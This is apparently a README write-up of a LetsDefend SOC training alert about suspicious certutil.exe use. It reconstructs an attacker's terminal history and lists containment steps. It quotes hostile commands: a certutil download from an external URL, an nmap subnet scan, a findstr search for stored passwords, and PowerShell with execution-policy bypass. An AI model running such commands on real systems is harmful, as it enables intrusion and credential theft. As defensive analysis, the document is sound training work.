# LetsDefend-SOC163-Certutil-Analysis
Detailed analysis and investigation of SOC163 - Suspicious Certutil.exe Usage alert on LetsDefend.
# LetsDefend: SOC163 - Suspicious Certutil.exe Usage (Write-Up)

Hey everyone! In this write-up, I will walk you through my analysis of a Medium severity alert on LetsDefend involving a suspicious LOLBin activity on a production host. 

## 🚨 Alert Overview
*   **Rule Name:** SOC163 - Suspicious Certutil.exe Usage
*   **Target Host:** EricProd (172.16.17.22)
*   **EDR Action:** Allowed 
*   **Trigger Command:** `certutil.exe -urlcache -split -f https://nmap.org nmap.zip`

Since the EDR action was **Allowed**, the very first thing I realized was that this wasn't a blocked attempt—the activity actually executed, meaning the attacker was actively running commands inside the system.

---

## 🔍 Investigation Steps & Terminal History Analysis

I jumped into the **Endpoint Security** tab to check the terminal history of `EricProd`. When I looked at the timeline, the attacker's footprint became incredibly clear. Here is how the attack unfolded chronologically:

1.  **Reconnaissance (10:24 - 10:27):** 
    The user/attacker ran `netstat`, `tasklist`, and `systeminfo`. They were mapping the network connections, active processes, and OS architecture to find weak spots.
2.  **LOLBin Utilization (11:06 - 11:07):** 
    They used `certutil.exe` (a legitimate Windows built-in tool, or LOLBin) with the `-f` and `-split` parameters to bypass basic controls and download external hacking tools:
    *   `nmap-7.92-setup.exe` (Network scanner)
    *   `windows-exploit-suggester.py` (Local privilege escalation checker)
3.  **Internal Scanning & Enumeration (11:08 - 19:32):**
    *   Scanned the entire subnet for web servers (`nmap -sV 192.168.0.0/24 -p 80`).
    *   Executed the exploit suggester script.
    *   Looked for cached network neighbors via `arp -a`.
    *   Ran a deep string search (`findstr /si pass *.txt | *.xml...`) across the system files to harvest cleartext credentials.
4.  **Defense Evasion (21:36):**
    They fired up PowerShell with execution policy bypass parameters (`-nop -exec bypass`), preparing for a deeper foothold or script execution.

---

## 💡 Lessons Learned & Playbook Logic (My Thought Process)

This case taught me a great lesson about how SOC platforms categorize activities. During the playbook phase, I was prompted to choose who performed the activity: **User**. 

Initially, since these are malicious tools (Nmap, exploit suggester), it feels like a malware incident. However, looking at the terminal history, there is a live threat actor manually typing commands inside a compromised user session. Since it wasn't a self-replicating, automated piece of malware but rather an interactive hands-on-keyboard attack leveraging a user account, **"User"** was the correct playbook choice.

---

## 🎯 Remediation & Conclusion

I successfully closed this case as a **True Positive** with the following containment actions:

1.  **Host Isolation:** Immediately quarantined `EricProd` from the network to stop the internal Nmap scanning and potential credential exfiltration.
2.  **TI / Blocklist:** Extracted the malicious URLs used by certutil and added them to our threat intel/firewall blocklists.
3.  **Escalation:** Escalated the ticket to Tier 2/Forensic team to investigate how the initial compromise happened on that specific user account.

**Final Status:** True Positive | Host Isolated | Case Resolved.
